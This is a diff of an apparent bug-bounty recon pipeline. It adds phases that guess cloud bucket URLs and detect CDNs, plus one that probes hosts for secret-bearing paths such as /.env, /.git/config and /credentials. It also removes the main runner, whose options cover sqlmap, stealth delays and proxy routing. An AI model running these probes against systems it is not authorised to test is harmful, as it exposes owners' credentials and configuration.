-        entries = read_lines(p)
-        if not entries:
-            continue
-        lines.append(f"── {key} ({len(entries)} entries)")
-        for i, entry in enumerate(entries[:5]):
-            lines.append(f"  {entry[:120]}")
-        if len(entries) > 5:
-            lines.append(f"  … and {len(entries) - 5} more")
-        lines.append("")
-    # OOB callbacks
-    oast = outdir / "oast" / "callbacks.txt"
-    if oast.exists() and count_nonblank(oast):
-        lines.append(f"── OOB callbacks ({count_nonblank(oast)} entries)")
-        for ln in read_lines(oast)[:5]:
-            lines.append(f"  {ln[:120]}")
-        lines.append("")
-    lines.append("=" * 60)
-    out = ensure(outdir / "summary.txt")
-    out.write_text("\n".join(lines) + "\n")
-    return out
-
-
-def md_escape(s: str) -> str:
-    """Escape HTML-special characters in markdown content so a renderer
-    that processes raw HTML (e.g. GitHub, GitLab) does not execute it."""
-    return (
-        s.replace("&", "&amp;")
-        .replace("<", "&lt;")
-        .replace(">", "&gt;")
-    )
-
-
-def write_markdown(outdir: Path, domain: str, counts: Dict[str, int], missing: List[str]) -> Path:
-    lines = [
-        f"# Recon Report — {domain}",
-        f"_generated {datetime.now().isoformat(timespec='seconds')}_",
-        "",
-    ]
-    if missing:
-        lines += ["## ⚠ Missing tools", ", ".join(f"`{md_escape(m)}`" for m in missing), ""]
-    lines += ["## Summary", "", "| Artifact | Count |", "|---|---:|"]
-    for k, n in counts.items():
-        lines.append(f"| `{md_escape(k)}` | {n} |")
-    lines += ["", "## Artifacts", ""]
-    for f in sorted(outdir.glob("*.txt")):
-        lines.append(f"- `{md_escape(f.name)}`")
-    oast = outdir / "oast" / "callbacks.txt"
-    if oast.exists():
-        lines += ["", "## OOB callbacks", ""]
-        for ln in read_lines(oast)[:50]:
-            lines.append(f"- `{md_escape(ln)}`")
-    out = ensure(outdir / "report.md")
-    out.write_text("\n".join(lines) + "\n")
-    return out
-
-
 async def phase_44_CHAIN(
     outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
 ) -> Dict[str, Any]:
@@ -7149,6 +5604,176 @@ async def phase_45_EVIDENCE(
 
 
 # ───────────────────────────── pipeline runner ─────────────────────────────
+
+# ─────────── New phases (enhancements) ───────────
+
+async def phase_46_BUCKET(
+    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
+) -> Dict[str, Any]:
+    if skip & {"46-BUCKET"}:
+        return {}
+    _out = outdir / "bucket_enum.txt"
+    if _out.exists() and not force:
+        return {"46-BUCKET": str(_out), "count": count_nonblank(_out)}
+    log("info", "Phase 46-BUCKET: cloud bucket enumeration (AWS/GCP/Azure)")
+    domains = set()
+    for key in ("01-RECON", "02-RESOLVE", "04-SCAN"):
+        p = prev.get(key)
+        if p and isinstance(p, str):
+            for ln in read_lines(Path(p)) if Path(p).exists() else []:
+                ln = ln.strip().lower()
+                if ln:
+                    domains.add(ln)
+    subs = outdir / "all_subs.txt"
+    if subs.exists():
+        for ln in read_lines(subs):
+            ln = ln.strip().lower()
+            if ln:
+                domains.add(ln)
+    findings: List[str] = []
+    seen: Set[str] = set()
+    for d in sorted(domains)[:_PIPELINE_CFG.sample_hosts_cloud]:
+        base = d.split(".")[0]
+        candidates = [
+            f"https://{base}.s3.amazonaws.com",
+            f"https://{base}-assets.s3.amazonaws.com",
+            f"https://{base}-backup.s3.amazonaws.com",
+            f"https://{base}-uploads.s3.amazonaws.com",
+            f"https://{base}.s3-website-{random.choice(['us-east-1', 'us-west-2', 'eu-west-1'])}.amazonaws.com",
+            f"https://{base}.storage.googleapis.com",
+            f"https://{base}-assets.storage.googleapis.com",
+            f"https://{base}.blob.core.windows.net",
+            f"https://{base}-assets.blob.core.windows.net",
+            f"https://{base}.digitaloceanspaces.com",
+        ]
+        for url in candidates:
+            if url in seen:
+                continue
+            seen.add(url)
+            try:
+                await _throttle_rate()
+                req = urllib.request.Request(url, method="HEAD")
+                urlopen = _get_urlopener()
+                code, _, _ = await _async_urlopen(urlopen, req, timeout=10)
+                if code < 400:
+                    findings.append(f"[open] {url} (HTTP {code})")
+                elif code == 403:
+                    findings.append(f"[restricted] {url} (HTTP 403)")
+            except Exception:
+                continue
+    ensure(_out).write_text("\n".join(findings) + ("\n" if findings else ""))
+    log("ok", f"46-BUCKET: {len(findings)} bucket(s) found")
+    return {"46-BUCKET": str(_out), "count": len(findings)}
+
+
+async def phase_47_CDN(
+    domain: str, outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
+) -> Dict[str, Any]:
+    if skip & {"47-CDN"}:
+        return {}
+    _out = outdir / "cdn_detection.txt"
+    if _out.exists() and not force:
+        return {"47-CDN": str(_out), "count": count_nonblank(_out)}
+    log("info", "Phase 47-CDN: CDN detection and origin IP discovery")
+    hosts = set()
+    for key in ("02-RESOLVE", "04-SCAN"):
+        p = prev.get(key)
+        if p and isinstance(p, str) and Path(p).exists():
+            for ln in read_lines(Path(p)):
+                ln = ln.strip().lower()
+                if ln and _is_valid_hostname(ln):
+                    hosts.add(ln)
+    resolved = outdir / "resolved.txt"
+    if resolved.exists():
+        for ln in read_lines(resolved):
+            ln = ln.strip().lower()
+            if ln and _is_valid_hostname(ln):
+                hosts.add(ln)
+    findings: List[str] = []
+    cdn_signatures = {
+        "cloudflare": ["cloudflare", "__cfduid", "cf-ray"],
+        "cloudfront": ["cloudfront.net", "x-amz-cf-id"],
+        "akamai": ["akamai", "akamaized"],
+        "fastly": ["fastly", "x-fastly-request"],
+        "incapsula": ["incapsula", "X-Iinfo"],
+        "sucuri": ["sucuri", "x-sucuri-id"],
+        "stackpath": ["stackpath", "stackpath-cdn"],
+        "keycdn": ["keycdn"],
+        "cdn77": ["cdn77"],
+    }
+    for h in sorted(hosts)[:_PIPELINE_CFG.sample_hosts_origin]:
+        try:
+            await _throttle_rate()
+            urlopen = _get_no_redirect_urlopener()
+            req = urllib.request.Request(f"https://{h}", method="HEAD")
+            code, headers, _ = await _async_urlopen_no_redirect(urlopen, req, timeout=10)
+            hdr_str = str(dict(headers)).lower()
+            detected = [name for name, sigs in cdn_signatures.items() if any(s in hdr_str for s in sigs)]
+            if detected:
+                findings.append(f"[CDN] {h}: {', '.join(detected)}")
+        except Exception:
+            pass
+    ensure(_out).write_text("\n".join(findings) + ("\n" if findings else ""))
+    log("ok", f"47-CDN: {len(findings)} CDN(s) detected")
+    return {"47-CDN": str(_out), "count": len(findings)}
+
+
+async def phase_48_CONTENT(
+    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
+) -> Dict[str, Any]:
+    if skip & {"48-CONTENT"}:
+        return {}
+    _out = outdir / "content_discovery.txt"
+    if _out.exists() and not force:
+        return {"48-CONTENT": str(_out), "count": count_nonblank(_out)}
+    log("info", "Phase 48-CONTENT: content discovery via common paths")
+    hosts = set()
+    for key in ("02-RESOLVE", "04-SCAN"):
+        p = prev.get(key)
+        if p and isinstance(p, str) and Path(p).exists():
+            for ln in read_lines(Path(p)):
+                ln = ln.strip().lower()
+                if ln and _is_valid_hostname(ln):
+                    hosts.add(ln)
+    targets = outdir / "host_targets.txt"
+    if targets.exists():
+        for ln in read_lines(targets):
+            ln = ln.strip().lower()
+            if ln and _is_valid_hostname(ln):
+                hosts.add(ln)
+    common_paths = [
+        "/.env", "/.git/config", "/.git/HEAD", "/admin", "/api", "/backup",
+        "/config", "/config.php", "/credentials", "/db", "/debug",
+        "/docker-compose.yml", "/dump", "/index.php", "/info.php",
+        "/jenkins", "/logs", "/node_modules", "/phpinfo.php",
+        "/private", "/robots.txt", "/sitemap.xml", "/sql", "/ssh",
+        "/swagger.json", "/swagger-ui.html", "/test", "/uploads",
+        "/wp-admin", "/wp-content", "/wp-json", "/wsdl",
+    ]
+    findings: List[str] = []
+    seen_urls: Set[str] = set()
+    for h in sorted(hosts)[:_PIPELINE_CFG.sample_hosts_git]:
+        for path in common_paths:
+            url = f"https://{h}{path}"
+            if url in seen_urls:
+                continue
+            seen_urls.add(url)
+            if len(findings) >= _PIPELINE_CFG.sample_urls_fuzz:
+                break
+            try:
+                await _throttle_rate()
+                urlopen = _get_urlopener()
+                req = urllib.request.Request(url, method="GET")
+                code, _, body = await _async_urlopen(urlopen, req, timeout=10)
+                if code < 400:
+                    size = len(body)
+                    findings.append(f"[found] {url} (HTTP {code}, {size}b)")
+            except Exception:
+                continue
+    ensure(_out).write_text("\n".join(findings) + ("\n" if findings else ""))
+    log("ok", f"48-CONTENT: {len(findings)} path(s) discovered")
+    return {"48-CONTENT": str(_out), "count": len(findings)}
+
 PIPELINE = [
     ("00-SCOPE", phase_00_SCOPE, ("domain", "outdir", "t", "only", "skip", "force")),
     ("01-RECON", phase_01_RECON, ("domain", "outdir", "t", "only", "skip", "resume", "force")),
@@ -7201,6 +5826,9 @@ PIPELINE = [
     ("43-DESERIAL", phase_43_DESERIAL, ("outdir", "t", "only", "skip", "prev", "force")),
     ("44-CHAIN", phase_44_CHAIN, ("outdir", "t", "only", "skip", "prev", "force")),
     ("45-EVIDENCE", phase_45_EVIDENCE, ("outdir", "t", "only", "skip", "prev", "force")),
+    ("46-BUCKET", phase_46_BUCKET, ("outdir", "t", "only", "skip", "prev", "force")),
+    ("47-CDN", phase_47_CDN, ("domain", "outdir", "t", "only", "skip", "prev", "force")),
+    ("48-CONTENT", phase_48_CONTENT, ("outdir", "t", "only", "skip", "prev", "force")),
 ]
 # Phase weights for progress bar accuracy (heuristic based on typical runtime).
 # Heavier phases (subdomain enum, port scan, nuclei, sqlmap, fuzz) contribute
@@ -7257,6 +5885,9 @@ _PHASE_WEIGHTS: Dict[str, int] = {
     "43-DESERIAL": 3,
     "44-CHAIN": 1,
     "45-EVIDENCE": 3,
+    "46-BUCKET": 3,
+    "47-CDN": 2,
+    "48-CONTENT": 5,
 }
 # Dependency-ordered execution stages. Phases in the same stage are independent
 # of one another (they only read artifacts produced by *earlier* stages, never
@@ -7301,399 +5932,11 @@ STAGES: List[List[str]] = [
     ["44-CHAIN"],
     # Stage 16 — Evidence capture after correlation has written its findings
     ["45-EVIDENCE"],
+    # Stage 17 — New enhancement phases (run after evidence capture)
+    ["46-BUCKET", "47-CDN", "48-CONTENT"],
 ]
 
 
-def _atomic_write_json(path: Path, payload: dict) -> None:
-    """Write JSON atomically: temp file + rename, so a mid-write crash
-    can't leave a half-written state.json that breaks --resume."""
-    ensure(path)
-    tmp = path.with_suffix(path.suffix + ".tmp")
-    try:
-        with tmp.open("w") as f:
-            json.dump(payload, f, indent=2, default=str)
-        os.replace(tmp, path)
-    except Exception:
-        with contextlib.suppress(Exception):
-            tmp.unlink(missing_ok=True)
-        raise
-
-
-def _parse_phase_csv(value: str) -> PhaseSet:
-    phases = {p.strip().upper() for p in value.split(",") if p.strip()}
-    invalid = sorted(phases - VALID_PHASES)
-    if invalid:
-        raise argparse.ArgumentTypeError(
-            f"unknown phase(s): {', '.join(invalid)}; valid phases: "
-            f"{', '.join(sorted(VALID_PHASES))}"
-        )
-    return phases
-
-
-def _domain_arg(value: str) -> str:
-    domain = value.rstrip(".").lower()
-    if not _is_valid_hostname(domain):
-        raise argparse.ArgumentTypeError(
-            "domain must be a valid DNS name with at least one dot, for example example.com"
-        )
-    return domain
-
-
-def _csv_from_phases(value: object) -> PhaseSet:
-    if isinstance(value, set):
-        return {str(v).upper() for v in value}
-    if isinstance(value, str):
-        return _parse_phase_csv(value)
-    return set()
-
-
-async def run_pipeline(args: argparse.Namespace) -> int:
-    _TOOL_RC_REGISTRY.clear()
-    outdir = Path(args.out).resolve()
-    if outdir.exists() and not outdir.is_dir():
-        raise ValueError(f"output path exists and is not a directory: {outdir}")
-    outdir.mkdir(parents=True, exist_ok=True)
-    # Clean up stale .tmp and .ds_tmp files from prior crashed atomic writes
-    for tmp in outdir.glob("*.tmp"):
-        tmp.unlink(missing_ok=True)
-    for tmp in outdir.glob("*.ds_tmp"):
-        tmp.unlink(missing_ok=True)
-    state_path = outdir / "state.json"
-    state: Dict[str, Any] = {
-        "domain": args.domain,
-        "artifacts": {},
-        "missing_tools": [],
-        "tool_failures": {},
-    }
-    if args.resume and state_path.exists():
-        try:
-            with state_path.open() as f:
-                saved = json.load(f)
-            # --resume only makes sense for the same target domain. If the
-            # state file is for a different domain, start fresh so we never
-            # accidentally reuse the wrong target's artifacts.
-            if saved.get("domain") and saved.get("domain") != args.domain:
-                log(
-                    "warn",
-                    f"state.json is for domain {saved.get('domain')!r}, "
-                    f"not {args.domain!r}; ignoring and starting fresh",
-                )
-            else:
-                # Resolve stored artifact paths against THIS outdir. The
-                # state file may have been written from a previous run
-                # whose absolute paths no longer apply (BUG-6); relative
-                # paths from the stored outdir are rebased onto outdir.
-                prev_outdir_s = saved.get("outdir")
-                prev_outdir = Path(prev_outdir_s) if prev_outdir_s else None
-                rebased: Dict[str, Any] = {}
-                for k, v in (saved.get("artifacts") or {}).items():
-                    if not isinstance(v, str):
-                        continue
-                    p = Path(v)
-                    if p.is_absolute() and prev_outdir is not None:
-                        try:
-                            p = p.relative_to(prev_outdir)
-                        except ValueError:
-                            pass  # path wasn't under the old outdir; keep as-is
-                        rebased[k] = str(outdir / p)
-                    elif p.is_absolute():
-                        rebased[k] = v
-                    else:
-                        rebased[k] = str(outdir / p)
-                saved["artifacts"] = rebased
-                state = saved
-                log("info", f"resuming from {state_path}")
-        except json.JSONDecodeError:
-            log("warn", f"{state_path} corrupt; ignoring and starting fresh")
-    # Always record the outdir we actually used so future resumes can
-    # rebase stored artifact paths (see BUG-6).
-    state["outdir"] = str(outdir)
-    t = Tools()
-    scan_status = ScanStatus(args.domain, outdir)
-    only = _csv_from_phases(args.only)
-    skip = _csv_from_phases(args.skip)
-    if args.fast and not only:
-        only = FAST_PHASES
-    if only and skip:
-        overlap = sorted(only & skip)
-        if overlap:
-            raise ValueError(f"phase(s) cannot be both --only and --skip: {', '.join(overlap)}")
-    # pre-seed missing tools from state so a partial resume doesn't lose them,
-    # but re-check each one so newly installed tools are recognized.
-    for m in list(state.get("missing_tools", [])):
-        if shutil.which(m):
-            state["missing_tools"].remove(m)
-        else:
-            t.seed_missing([m])
-    # Bind the process-wide job semaphore to THIS event loop so every phase's
-    # run_parallel() shares one budget of live external processes.
-    global _JOB_SEM, _PIPELINE_CFG, _USE_PROXYCHAINS
-
-    proxy = getattr(args, 'proxy', '')
-    if not proxy:
-        proxy = _auto_detect_proxy()
-
-    # Set ALL proxy env vars so every subprocess inherits them.
-    # Go tools (httpx, ffuf, nuclei, katana, dalfox, etc.) and Python tools
-    # (via urllib) automatically respect ALL_PROXY/HTTPS_PROXY/HTTP_PROXY,
-    # so all tools work with proxies without per-tool configuration.
-    if proxy:
-        _set_proxy_env(proxy)
-
-    # Only enable proxychains4 for bash runner scripts when actually routing
-    # through a SOCKS proxy. Direct tool calls get proxy via env vars + explicit
-    # flags (see _needs_proxychains). Auto-detecting proxychains4 just because
-    # the binary is on PATH would force every bash runner through Tor even when
-    # the user does not want it.
-    _USE_PROXYCHAINS = bool(
-        proxy
-        and shutil.which("proxychains4")
-        and proxy.startswith("socks")
-    )
-    if proxy:
-        import socket as _proxy_socket
-        try:
-            _parsed = urllib.parse.urlparse(proxy)
-            _proxy_host = _parsed.hostname
-            _proxy_port = _parsed.port
-            if not _proxy_host:
-                _proxy_url = proxy.split("://")[-1]
-                _proxy_host = _proxy_url.split(":")[0]
-                _proxy_port = int(_proxy_url.split(":")[1].split("/")[0])
-            elif not _proxy_port:
-                _default_ports = {"http": 80, "https": 443,
-                                  "socks4": 1080, "socks5": 1080,
-                                  "socks5h": 1080, "socks4a": 1080}
-                _proxy_port = _default_ports.get(_parsed.scheme, 1080)
-            _s = _proxy_socket.create_connection((_proxy_host, _proxy_port), timeout=3)
-            _s.close()
-        except Exception:
-            log("warn", f"Proxy {proxy} reachability check failed — continuing with proxy enabled (may cause timeouts if truly unreachable)")
-
-    cookie = getattr(args, 'cookie', '')
-    if not cookie:
-        cookie = _auto_detect_cookies()
-
-    _PIPELINE_CFG = PipelineConfig(
-        sqlmap_level=getattr(args, 'sqlmap_level', 1),
-        sqlmap_risk=getattr(args, 'sqlmap_risk', 1),
-        delay=getattr(args, 'delay', 0.0),
-        rate_limit=getattr(args, 'rate_limit', 0),
-        sample_urls_fuzz=getattr(args, 'sample_urls_fuzz', 200),
-        sample_urls_params=getattr(args, 'sample_urls_params', 50),
-        sample_hosts_ssl=getattr(args, 'sample_hosts_ssl', 10),
-        sample_hosts_origin=getattr(args, 'sample_hosts_origin', 10),
-        sample_endpoints_l=getattr(args, 'sample_endpoints_l', 20),
-        sample_urls_xss_blind=getattr(args, 'sample_urls_xss_blind', 20),
-        sample_urls_ssti=getattr(args, 'sample_urls_ssti', 5),
-        sample_endpoints_post=getattr(args, 'sample_endpoints_post', 5),
-        sample_endpoints_cors=getattr(args, 'sample_endpoints_cors', 10),
-        nuclei_exclude_tags=getattr(args, 'exclude_tags', ''),
-        proxy=proxy,
-        sample_urls_nosqli=getattr(args, 'sample_urls_nosqli', 30),
-        sample_endpoints_race=getattr(args, 'sample_endpoints_race', 10),
-        sample_hosts_jwt=getattr(args, 'sample_hosts_jwt', 20),
-        sample_urls_xxe=getattr(args, 'sample_urls_xxe', 10),
-        sample_urls_cmdi=getattr(args, 'sample_urls_cmdi', 30),
-        sample_endpoints_sspp=getattr(args, 'sample_endpoints_sspp', 10),
-        sample_hosts_cached=getattr(args, 'sample_hosts_cached', 10),
-        sample_urls_depcheck=getattr(args, 'sample_urls_depcheck', 30),
-    )
-    jobs = max(1, args.jobs)
-    _JOB_SEM = asyncio.Semaphore(jobs)
-    oast = Interactsh(outdir)
-    oast_started = False
-    phase_map = {name: fn for name, fn, _ in PIPELINE}
-
-    def _selected(name: str) -> bool:
-        return (not only or name in only) and name not in skip
-
-    phases_to_run = [name for name, _, _ in PIPELINE if _selected(name)]
-    progress = Progress(phases_to_run, stages=STAGES)
-    scan_status.set_total(len(phases_to_run))
-    active_needs_oast = any(name in {"08-FUZZ", "09-VULNSCAN", "10-TLSCMS", "11-INJECT"} for name in phases_to_run)
-    h_selected = _selected("13-OOB")
-    if active_needs_oast and h_selected:
-        oast_started = oast.start()
-
-    def _apply(name: str, result: Dict[str, Any]) -> None:
-        """Fold a finished phase's result into prev/state. Runs in the single
-        event-loop thread (synchronous, no await), so it is race-free even when
-        phases in a stage complete concurrently."""
-        prev.update(result or {})
-        state["artifacts"].update({k: v for k, v in (result or {}).items() if not isinstance(v, str) or (v.endswith(".txt") and Path(v).exists())})
-        # accumulate (not overwrite) missing tools across phases
-        for m in t.missing:
-            if m not in state["missing_tools"]:
-                state["missing_tools"].append(m)
-        # surface partial tool failures (BUG-5): non-zero exits / timeouts the
-        # run survived but whose artifact is partial. Shown in summary.json.
-        new_failures = (result or {}).get("failures") or {}
-        if isinstance(new_failures, dict):
-            state.setdefault("tool_failures", {}).update(
-                {k: int(v) for k, v in new_failures.items()}
-            )
-        # Also pull from the global rc registry so phases that discard
-        # run_parallel's StepResult list still propagate non-zero exits.
-        state.setdefault("tool_failures", {}).update(
-            {k: int(v) for k, v in _TOOL_RC_REGISTRY.items()
-             if k not in state.setdefault("tool_failures", {})}
-        )
-
-    if cookie:
-        os.environ["COOKIE"] = cookie
-    elif "COOKIE" in os.environ:
-        del os.environ["COOKIE"]
-    extra_hdrs = list(getattr(args, 'extra_headers', []))
-    if extra_hdrs:
-        os.environ["EXTRA_HEADERS"] = "\n".join(extra_hdrs)
-    elif "EXTRA_HEADERS" in os.environ:
-        del os.environ["EXTRA_HEADERS"]
-
-    phase_timing: Dict[str, Dict[str, str]] = {}
-
-    async def _run_phase(name: str) -> Dict[str, Any]:
-        fn = phase_map[name]
-        kwargs = {
-            "domain": args.domain,
-            "outdir": outdir,
-            "t": t,
-            "only": only,
-            "skip": skip,
-            "prev": prev,
-            "oast_domain": oast.domain,
-            "oast": oast,
-            "resume": bool(args.resume),
-            "force": bool(getattr(args, 'force', False)),
-        }
-        sig = inspect.signature(fn)
-        call = {k: v for k, v in kwargs.items() if k in sig.parameters}
-        scan_status.set_phase(name)
-        scan_status.add_running(name)
-        t0 = datetime.now()
-        try:
-            result = await fn(**call)
-        except Exception as e:
-            log("err", f"phase {name} crashed: {e}")
-            scan_status.add_error(str(e))
-            result = {}
-        t1 = datetime.now()
-        elapsed = (t1 - t0).total_seconds()
-        phase_timing[name] = {
-            "start": t0.isoformat(timespec="seconds"),
-            "end": t1.isoformat(timespec="seconds"),
-            "elapsed_seconds": round(elapsed, 1),
-        }
-        scan_status.add_completed(name)
-        scan_status.set_missing(state.get("missing_tools", []))
-        progress.next(name)
-        return result or {}
-
-    # Register signal handlers so child processes are cleaned up when
-    # the script is killed externally (e.g. timeout command, Ctrl+C).
-    _orig_sigint = signal.signal(signal.SIGINT, lambda s, f: (_cleanup_child_procs(), os._exit(130)))
-    _orig_sigterm = signal.signal(signal.SIGTERM, lambda s, f: (_cleanup_child_procs(), os._exit(143)))
-
-    try:
-        # Update nuclei templates before any phase runs so phases that use
-        # nuclei (e.g. 04-SCAN's DNS takeover) don't fail with missing templates.
-        # Only run if at least one selected phase actually uses nuclei.
-        _NUCLEI_PHASES = {"04-SCAN", "06-JSINTEL", "09-VULNSCAN", "10-TLSCMS"}
-        if any(p in _NUCLEI_PHASES for p in phases_to_run):
-            await _update_nuclei_templates(outdir)
-
-        prev: Dict[str, Any] = dict(state.get("artifacts", {}))
-        # Load WAF state from previous run if available
-        waf_file = outdir / "waf_detection.txt"
-        if waf_file.exists():
-            waf_lines = read_lines(waf_file)
-            _PIPELINE_CFG.waf_detected = any("detected" in l.lower() and "no waf" not in l.lower() for l in waf_lines)
-            if _PIPELINE_CFG.waf_detected:
-                _PIPELINE_CFG.waf_evasion_throttle = 1.0
-        for stage in STAGES:
-            run_now = [name for name in stage if _selected(name)]
-            for name in stage:
-                if name in skip:
-                    log("skip", f"phase {name} (--skip)")
-                elif only and name not in only:
-                    log("skip", f"phase {name} (not in --only)")
-            if not run_now:
-                continue
-            # Independent phases in a stage run concurrently; they only read
-            # artifacts from earlier stages, so a shared `prev` snapshot is safe.
-            tasks = {n: asyncio.ensure_future(_run_phase(n)) for n in run_now}
-            done, pending = await asyncio.wait(list(tasks.values()), timeout=7200)
-            if pending:
-                log("warn", f"stage {stage}: {len(pending)} phase(s) timed out after 7200s; collecting partial results")
-            results = {}
-            for n, task in tasks.items():
-                if task in done:
-                    try:
-                        results[n] = task.result()
-                    except Exception as e:
-                        log("err", f"phase {n} crashed: {e}")
-                        results[n] = {}
-                else:
-                    task.cancel()
-                    results[n] = {}
-            for name in run_now:
-                _apply(name, results[name])
-                if getattr(args, 'sample', False):
-                    for k, v in (results[name] or {}).items():
-                        if isinstance(v, str) and v.endswith(".txt"):
-                            _downsample_file(Path(v), n=1)
-            try:
-                _atomic_write_json(state_path, state)
-            except Exception as e:
-                log("warn", f"state.json write failed: {e}")
-    finally:
-        _cleanup_child_procs()
-        signal.signal(signal.SIGINT, _orig_sigint)
-        signal.signal(signal.SIGTERM, _orig_sigterm)
-        if oast_started:
-            oast.stop()
-        _JOB_SEM = None
-        scan_status.close()
-    counts = _counts(outdir)
-    # gowitness screenshots on discovered hosts
-    if t.has("gowitness"):
-        gowitness_targets = outdir / "host_targets.txt"
-        if gowitness_targets.exists() and read_lines(gowitness_targets):
-            screenshots_dir = ensure(outdir / "screenshots")
-            _gw_proxy = []
-            if _PIPELINE_CFG.proxy:
-                _gw_proxy = ["--proxy", _PIPELINE_CFG.proxy]
-            await _run(
-                "gowitness",
-                ["gowitness", "scan", "file", "-f", str(gowitness_targets),
-                 "-s", str(screenshots_dir), "--db", str(outdir / "gowitness.db")] + _gw_proxy,
-                _maybe_timeout(600), outdir,
-            )
-            n_screenshots = len(list(screenshots_dir.glob("*.png"))) if screenshots_dir.exists() else 0
-            if n_screenshots:
-                log("ok", f"gowitness: {n_screenshots} screenshots → {screenshots_dir}")
-    sj = write_summary(outdir, args.domain, state, counts)
-    # Reopen summary.json to inject phase_timing after write_summary
-    if sj.exists():
-        try:
-            with sj.open() as f:
-                summ = json.load(f)
-            summ["phase_timing"] = phase_timing
-            _atomic_write_json(sj, summ)
-        except Exception:
-            pass
-    hj = write_html(outdir, args.domain, counts, t.missing)
-    mj = write_markdown(outdir, args.domain, counts, t.missing)
-    tj = write_full_summary(outdir, args.domain, counts, t.missing)
-    log("ok", f"summary → {sj}")
-    log("ok", f"report  → {hj}")
-    log("ok", f"report  → {mj}")
-    log("ok", f"details → {tj}")
-    progress.close()
-    return 0
-
-
-# ────────────────────────── interactive setup ──────────────────────────────
 _RECON_LEVELS = {
     "1": {
         "name": "Basic reconnaissance",
@@ -7711,726 +5954,4 @@ _RECON_LEVELS = {
         "phases": VALID_PHASES,
     },
 }
-
-
-def _prompt(
-    prompt_text: str,
-    default: str = "",
-    validator: Optional[Callable[[str], bool]] = None,
-    error_msg: str = "",
-) -> str:
-    while True:
-        suffix = f" [{default}]" if default else ""
-        val = input(f"  {prompt_text}{suffix}: ").strip()
-        if not val:
-            return default
-        if validator is None or validator(val):
-            return val
-        log("err", error_msg or "invalid input")
-
-
-def _prompt_yes_no(prompt_text: str, default: bool = True) -> bool:
-    suffix = " [Y/n]" if default else " [y/N]"
-    val = input(f"  {prompt_text}{suffix}: ").strip().lower()
-    if not val:
-        return default
-    return val in ("y", "yes")
-
-
-def _banner() -> None:
-    banner = f"""
-{C["c"]}    ██████╗ ██████╗ ████████╗
-{C["c"]}    ██╔══██╗██╔══██╗╚══██╔══╝
-{C["c"]}    ██████╔╝██████╔╝   ██║
-{C["c"]}    ██╔══██╗██╔══██╗   ██║
-{C["c"]}    ██████╔╝██████╔╝   ██║
-{C["c"]}    ╚═════╝ ╚═════╝    ╚═╝
-{C["r"]}
-{C["g"]}   ╔══════════════════════════════════════════════════════╗
-{C["g"]}   ║  {C["c"]}ReconChain v{__version__}{C["g"]}  —  {C["y"]}Bug Bounty Recon & Vuln Pipeline{C["g"]}   ║
-{C["g"]}   ║  {C["d"]}41+ tools  |  51 phases  |  DAG stages  |  Resumable{C["g"]}   ║
-{C["g"]}   ╚══════════════════════════════════════════════════════╝{C["r"]}
-"""
-    print(banner, flush=True)
-
-
-def interactive_setup() -> argparse.Namespace:
-    _banner()
-    log("info", "Interactive setup — press Ctrl+C anytime to abort\n")
-    # 1. Domain
-    domain = _prompt(
-        "Target domain (e.g. example.com)",
-        validator=_is_valid_hostname,
-        error_msg="Enter a valid domain with at least one dot",
-    )
-    # 2. Recon level
-    print(f"\n{C['b']}Recon levels:{C['r']}")
-    for key, lvl in sorted(_RECON_LEVELS.items()):
-        print(f"  {C['y']}{key:4}{C['r']} {lvl['name']}")
-        print(f"       {C['d']}{lvl['desc']}{C['r']}")
-    level = _prompt(
-        "Choose recon level",
-        default="full",
-        validator=lambda v: v in _RECON_LEVELS,
-        error_msg="Enter 1, 2, or full",
-    )
-    base_phases = _RECON_LEVELS[level]["phases"]
-    # 3. Output directory
-    out = _prompt("Output directory", default=f"./out_{domain}")
-    # 4. Concurrent jobs
-    jobs_str = _prompt(
-        "Max parallel processes",
-        default=str(MAX_PARALLEL_JOBS),
-        validator=lambda v: v.isdigit() and int(v) > 0,
-        error_msg="Enter a positive number",
-    )
-    jobs = int(jobs_str)
-    # 5. Scan depth configuration
-    print(f"\n{C['b']}Scan depth configuration:{C['r']}")
-    sqlmap_level = _prompt(
-        "SQLmap --level (1=fast/basic, 5=deep/slow)",
-        default="1",
-        validator=lambda v: v.isdigit() and 1 <= int(v) <= 5,
-        error_msg="Enter a number between 1 and 5",
-    )
-    sqlmap_risk = _prompt(
-        "SQLmap --risk (1=safe, 3=aggressive/destructive)",
-        default="1",
-        validator=lambda v: v.isdigit() and 1 <= int(v) <= 3,
-        error_msg="Enter a number between 1 and 3",
-    )
-    delay = _prompt(
-        "Delay between requests in seconds (0=fast, 2=polite, 5=stealth)",
-        default="0",
-        validator=lambda v: v.replace(".", "", 1).isdigit(),
-        error_msg="Enter a number (e.g. 0, 0.5, 2)",
-    )
-    # Proxy — auto-detect from environment
-    proxy = _auto_detect_proxy()
-    def _validate_count(v: str) -> bool:
-        return v.lower() == "all" or (v.isdigit() and int(v) > 0)
-
-    sample_fuzz = _prompt(
-        "Number of URLs to fuzz (enter 'all' for every URL, more = thorough but slow)",
-        default="5",
-        validator=_validate_count,
-        error_msg="Enter a positive number or 'all'",
-    )
-    sample_params = _prompt(
-        "Number of URLs for parameter discovery (enter 'all' for every URL, more = thorough but slow)",
-        default="50",
-        validator=_validate_count,
-        error_msg="Enter a positive number or 'all'",
-    )
-    # Speed mode — reduce sample sizes across all phases
-    speed = _prompt_yes_no("Fast mode — reduce sample sizes for quicker scans (thorough but slow by default)", default=False)
-    # 6. Authentication / headers
-    print(f"\n{C['b']}Authentication:{C['r']}")
-    cookie = _prompt(
-        "Cookie string (e.g. 'session=abc123'), or leave empty",
-        default="",
-    )
-    extra_headers_raw = _prompt(
-        "Extra HTTP headers, comma-separated (e.g. 'Authorization: Bearer xyz,X-Custom: val'), or leave empty",
-        default="",
-    )
-    extra_headers_list: List[str] = [h.strip() for h in extra_headers_raw.split(",") if h.strip()] if extra_headers_raw else []
-    # 7. Manual testing add-ons (only for level 2 / full)
-    extra_phases: Set[str] = set()
-    if level in ("2", "full"):
-        _all_extra = [
-            ("04b-TAKEOVER-VALIDATE", "Confirm dangling CNAME exploitability"),
-            ("05b-APISPEC", "API spec discovery (Swagger/OpenAPI/GraphQL SDL)"),
-            ("11b-SQLMAP", "SQL injection via sqlmap (pre-filtered)"),
-            ("12-SSTI", "SSTI fuzzing"),
